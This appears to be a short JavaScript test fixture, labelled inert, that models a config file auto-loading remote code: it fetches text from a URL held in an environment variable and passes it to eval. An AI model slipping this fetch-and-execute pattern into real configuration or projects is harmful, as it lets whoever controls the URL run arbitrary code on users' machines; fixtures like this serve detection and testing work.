// INERT test fixture — runtime-fetched payload in an auto-loaded config; performs nothing harmful.
const u = process.env.U;
fetch(u).then(r => r.text()).then(t => { stash = t; });
eval(stash);
